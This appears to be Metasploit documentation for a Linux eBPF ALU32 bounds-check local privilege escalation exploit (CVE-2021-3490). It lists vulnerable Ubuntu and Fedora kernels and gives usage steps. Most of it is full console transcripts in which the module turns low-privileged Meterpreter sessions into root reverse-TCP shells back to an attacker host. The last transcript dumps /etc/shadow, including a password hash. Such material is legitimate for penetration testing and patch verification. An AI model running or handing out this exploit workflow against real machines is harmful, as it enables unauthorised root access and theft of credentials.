## Vulnerable Application

Linux kernels from 5.7-rc1 prior to 5.13-rc4, 5.12.4, 5.11.21, and
5.10.37 are vulnerable to a bug in the eBPF verifier's verification
of ALU32 operations in the `scalar32_min_max_and` function when performing
AND operations, whereby under certain conditions the bounds of a
32 bit register would not be properly updated.

This can be abused by attackers to conduct an out of bounds read
and write in the Linux kernel and therefore achieve arbitrary
code execution as the `root` user.

The target system must be compiled with eBPF support and not have
`kernel.unprivileged_bpf_disabled` set to `1`, which prevents unprivileged
users from loading eBPF programs into the kernel. Note that if
`kernel.unprivileged_bpf_disabled` is enabled this module can still be
utilized to bypass protections such as SELinux, however the user
must already be logged into the system as a privileged user such as `root`.

### Vulnerable Targets
Ubuntu 20.04 (Focal Fossa) 5.8.x kernels prior to 5.8.0-53.60
Ubuntu 20.10 (Groovy Gorilla) 5.8.x kernels prior to 5.8.0-53.60
Ubuntu 21.04 (Hirsute Hippo) 5.11.x kernels prior to 5.11.0-17.18

## Verification Steps

  1. Start `msfconsole`
  2. Gain a Linux Meterpreter shell on a target vulnerable system.
  3. Do: `use exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe`
  4. Do: `set session #` where the session number corresponds to the low privileged Meterpreter session you spawned earlier.
  5. Do: `set LHOST <ip of your host>`
  6. Do: `set LPORT <port to connect back on>`
  7. Do: `exploit`


## Options

### WritableDir
A folder we can write files to.  Defaults to `/tmp`

### CmdTimeout
The maximum number of seconds to wait for the exploit to run before we end up timing out. Increase this value if the exploit is timing out.

## Scenarios

### Ubuntu 21.04 (with Linux 5.11.0-16-generic)

```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/bind_tcp
payload => linux/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/meterpreter/bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST                   no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set RHOST 192.168.224.221
RHOST => 192.168.224.221
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 192.168.224.221:4444
[*] Sending stage (3012548 bytes) to 192.168.224.221
[*] Meterpreter session 1 opened (192.168.224.128:41855 -> 192.168.224.221:4444) at 2021-08-17 17:37:31 -0500

meterpreter > sysinfo
Computer     : 192.168.224.221
OS           : Ubuntu 21.04 (Linux 5.11.0-16-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > shell
Process 4636 created.
Channel 1 created.
cat /etc/shadow
cat: /etc/shadow: Permission denied
exit
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                    Connection
  --  ----  ----                   -----------                                    ----------
  1         meterpreter x64/linux  test @ ubuntu (uid=1000, gid=1000, euid=1000,  192.168.224.128:41855 -> 192.168.224.221:4444
                                    egid=1000) @ 192.168.224.221                  (192.168.224.221)

msf6 exploit(multi/handler) > use exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > show options

Module options (exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.224.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > exploit

[*] Started reverse TCP handler on 192.168.224.128:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Writing '/tmp/.802fke5' (39352 bytes) ...
[*] Writing '/tmp/.75mogl0Vz6' (250 bytes) ...
[*] Launching exploit ...
[*] Sending stage (3012548 bytes) to 192.168.224.221
[+] Deleted /tmp/.802fke5
[+] Deleted /tmp/.75mogl0Vz6
[*] Meterpreter session 2 opened (192.168.224.128:4444 -> 192.168.224.221:42170) at 2021-08-17 17:40:19 -0500

meterpreter > sysinfo
Computer     : 192.168.224.221
OS           : Ubuntu 21.04 (Linux 5.11.0-16-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: root @ ubuntu (uid=0, gid=0, euid=0, egid=0)
meterpreter > background
[*] Backgrounding session 2...
smsf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                    Connection
  --  ----  ----                   -----------                                    ----------
  1         meterpreter x64/linux  test @ ubuntu (uid=1000, gid=1000, euid=1000,  192.168.224.128:41855 -> 192.168.224.221:4444
                                    egid=1000) @ 192.168.224.221                  (192.168.224.221)
  2         meterpreter x64/linux  root @ ubuntu (uid=0, gid=0, euid=0, egid=0)   192.168.224.128:4444 -> 192.168.224.221:42170
                                   @ 192.168.224.221                              (192.168.224.221)

msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) >
```


### Ubuntu 20.10 (with Linux 5.8.0-25-generic)

```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/bind_tcp
payload => linux/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/meterpreter/bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST                   no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set RHOST 192.168.224.220
RHOST => 192.168.224.220
msf6 exploit(multi/handler) > exploit

[*] Started bind TCP handler against 192.168.224.220:4444
[*] Sending stage (3012548 bytes) to 192.168.224.220
[*] Meterpreter session 1 opened (192.168.224.128:46051 -> 192.168.224.220:4444) at 2021-08-17 17:51:38 -0500

meterpreter > sysinfo
Computer     : 192.168.224.220
OS           : Ubuntu 20.10 (Linux 5.8.0-25-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: test @ ubuntu (uid=1000, gid=1000, euid=1000, egid=1000)
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > show options

Module options (exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.224.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > check
[*] The target appears to be vulnerable.
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > exploit

[*] Started reverse TCP handler on 192.168.224.128:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Writing '/tmp/.8lHII9pIja' (39352 bytes) ...
[*] Writing '/tmp/.x3iDbm3J' (250 bytes) ...
[*] Launching exploit ...
[*] Sending stage (3012548 bytes) to 192.168.224.220
[+] Deleted /tmp/.8lHII9pIja
[+] Deleted /tmp/.x3iDbm3J
[*] Meterpreter session 2 opened (192.168.224.128:4444 -> 192.168.224.220:47878) at 2021-08-17 17:53:36 -0500

meterpreter > sysinfo
Computer     : 192.168.224.220
OS           : Ubuntu 20.10 (Linux 5.8.0-25-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: root @ ubuntu (uid=0, gid=0, euid=0, egid=0)
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                    Connection
  --  ----  ----                   -----------                                    ----------
  1         meterpreter x64/linux  test @ ubuntu (uid=1000, gid=1000, euid=1000,  192.168.224.128:46051 -> 192.168.224.220:4444
                                    egid=1000) @ 192.168.224.220                  (192.168.224.220)
  2         meterpreter x64/linux  root @ ubuntu (uid=0, gid=0, euid=0, egid=0)   192.168.224.128:4444 -> 192.168.224.220:47878
                                   @ 192.168.224.220                              (192.168.224.220)

msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) >
```

### Ubuntu 20.04.02 LTS (with Linux 5.8.0-43-generic)
```
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/bind_tcp
payload => linux/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/meterpreter/bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST                   no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set RHOST 192.168.224.222
RHOST => 192.168.224.222
msf6 exploit(multi/handler) > exploit

[*] Started bind TCP handler against 192.168.224.222:4444
[*] Sending stage (3012548 bytes) to 192.168.224.222
[*] Meterpreter session 1 opened (192.168.224.128:44433 -> 192.168.224.222:4444) at 2021-08-19 14:15:49 -0500

meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > previous
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > show options

Module options (exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.224.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > check
[*] The target appears to be vulnerable.
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > exploit

[*] Started reverse TCP handler on 192.168.224.128:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Writing '/tmp/.RyfMnlY' (39352 bytes) ...
[*] Writing '/tmp/.7JmBQ1nu58' (250 bytes) ...
[*] Launching exploit ...
[*] Sending stage (3012548 bytes) to 192.168.224.222
[+] Deleted /tmp/.RyfMnlY
[+] Deleted /tmp/.7JmBQ1nu58
[*] Meterpreter session 2 opened (192.168.224.128:4444 -> 192.168.224.222:48204) at 2021-08-19 14:17:12 -0500

meterpreter > sysinfo
Computer     : 192.168.224.222
OS           : Ubuntu 20.04 (Linux 5.8.0-43-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: root @ ubuntu (uid=0, gid=0, euid=0, egid=0)
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                    Connection
  --  ----  ----                   -----------                                    ----------
  1         meterpreter x64/linux  test @ ubuntu (uid=1000, gid=1000, euid=1000,  192.168.224.128:44433 -> 192.168.224.222:4444
                                    egid=1000) @ 192.168.224.222                  (192.168.224.222)
  2         meterpreter x64/linux  root @ ubuntu (uid=0, gid=0, euid=0, egid=0)   192.168.224.128:4444 -> 192.168.224.222:48204
                                   @ 192.168.224.222                              (192.168.224.222)

msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) >
```

### Fedora 32 with Linux Kernel 5.7.11-200
```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/bind_tcp
payload => linux/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/meterpreter/bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST                   no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set RHOST 192.168.224.223
RHOST => 192.168.224.223
msf6 exploit(multi/handler) > exploit

[*] Started bind TCP handler against 192.168.224.223:4444
[*] Sending stage (3012548 bytes) to 192.168.224.223
[*] Meterpreter session 1 opened (192.168.224.128:41579 -> 192.168.224.223:4444) at 2021-08-20 13:29:30 -0500

meterpreter > sysinfo
Computer     : localhost.localdomain
OS           : Fedora 32 (Linux 5.7.11-200.fc32.x86_64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: test @ localhost.localdomain (uid=1000, gid=1000, euid=1000, egid=1000)
meterpreter > shell
Process 2100 created.
Channel 1 created.
cat /etc/shadow
cat: /etc/shadow: Permission denied
^Z
Background channel 1? [y/N]  y
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > show options

Module options (exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.224.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > check
[*] The target appears to be vulnerable.
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > exploit

[*] Started reverse TCP handler on 192.168.224.128:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Writing '/tmp/.VBiCx' (39352 bytes) ...
[*] Writing '/tmp/.KqjrGX5' (250 bytes) ...
[*] Launching exploit ...
[*] Sending stage (3012548 bytes) to 192.168.224.223
[+] Deleted /tmp/.VBiCx
[+] Deleted /tmp/.KqjrGX5
[*] Meterpreter session 2 opened (192.168.224.128:4444 -> 192.168.224.223:54884) at 2021-08-20 13:33:38 -0500
^C[-] Exploit failed [user-interrupt]: Interrupt
[-] exploit: Interrupted
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                    Connection
  --  ----  ----                   -----------                                    ----------
  1         meterpreter x64/linux  test @ localhost.localdomain (uid=1000, gid=1  192.168.224.128:41579 -> 192.168.224.223:4444
                                   000, euid=1000, egid=1000) @ loc...            (192.168.224.223)
  2         meterpreter x64/linux  root @ localhost.localdomain (uid=0, gid=0, e  192.168.224.128:4444 -> 192.168.224.223:54884
                                   uid=0, egid=0) @ localhost.local...            (192.168.224.223)

msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: root @ localhost.localdomain (uid=0, gid=0, euid=0, egid=0)
meterpreter > shell
Process 2148 created.
Channel 1 created.
cat /etc/shadow
root:!::0:99999:7:::
bin:*:18292:0:99999:7:::
daemon:*:18292:0:99999:7:::
adm:*:18292:0:99999:7:::
lp:*:18292:0:99999:7:::
sync:*:18292:0:99999:7:::
shutdown:*:18292:0:99999:7:::
halt:*:18292:0:99999:7:::
mail:*:18292:0:99999:7:::
operator:*:18292:0:99999:7:::
games:*:18292:0:99999:7:::
ftp:*:18292:0:99999:7:::
nobody:*:18292:0:99999:7:::
systemd-coredump:!!:18374::::::
systemd-network:!!:18374::::::
systemd-resolve:!!:18374::::::
dbus:!!:18374::::::
tss:!!:18374::::::
qemu:!!:18374::::::
gluster:!!:18374::::::
polkitd:!!:18374::::::
rtkit:!!:18374::::::
pulse:!!:18374::::::
systemd-timesync:!!:18374::::::
avahi:!!:18374::::::
pipewire:!!:18374::::::
chrony:!!:18374::::::
unbound:!!:18374::::::
usbmuxd:!!:18374::::::
dnsmasq:!!:18374::::::
geoclue:!!:18374::::::
saslauth:!!:18374::::::
radvd:!!:18374::::::
rpc:!!:18374:0:99999:7:::
apache:!!:18374::::::
colord:!!:18374::::::
rpcuser:!!:18374::::::
openvpn:!!:18374::::::
nm-openvpn:!!:18374::::::
abrt:!!:18374::::::
nm-openconnect:!!:18374::::::
flatpak:!!:18374::::::
gdm:!!:18374::::::
gnome-initial-setup:!!:18374::::::
sshd:!!:18374::::::
vboxadd:!!:18374::::::
tcpdump:!!:18374::::::
test:$6$qUS1ahlM0hqfNoyO$TZO8sUu1btvp4XRhqjy4Cetjm1LZ3DOWZDqfx8OPfB4QXjmiK5EPQmBW.TT0CJpSQBsanT0u9xokn1NtGepas/:18859:0:99999:7:::
```